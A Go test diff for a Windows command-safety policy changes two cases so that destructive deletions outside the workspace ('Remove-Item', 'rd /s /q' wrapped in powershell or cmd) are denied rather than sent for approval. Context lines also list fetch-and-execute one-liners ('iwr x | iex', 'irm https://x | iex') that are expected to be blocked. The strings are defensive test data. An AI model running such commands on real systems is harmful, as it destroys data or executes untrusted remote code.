@@ -136,8 +136,9 @@ func TestFloorWindows_PowerShellCmd(t *testing.T) {
 		wantAct   Action
 		wantFloor string
 	}{
-		{`powershell -Command "Remove-Item D:\outside"`, ActionAsk, ""},
-		{`cmd /c "rd /s /q D:\outside"`, ActionAsk, ""},
+		// The payload is parsed, so the floor sees the inner command.
+		{`powershell -Command "Remove-Item D:\outside"`, ActionDeny, "no-destructive-outside"},
+		{`cmd /c "rd /s /q D:\outside"`, ActionDeny, "no-destructive-outside"},
 		{`pwsh -c "iwr x | iex"`, ActionDeny, "no-curl-sh"},
 		{`powershell -NoProfile -Command "irm https://x | iex"`, ActionDeny, "no-curl-sh"},
 	} {
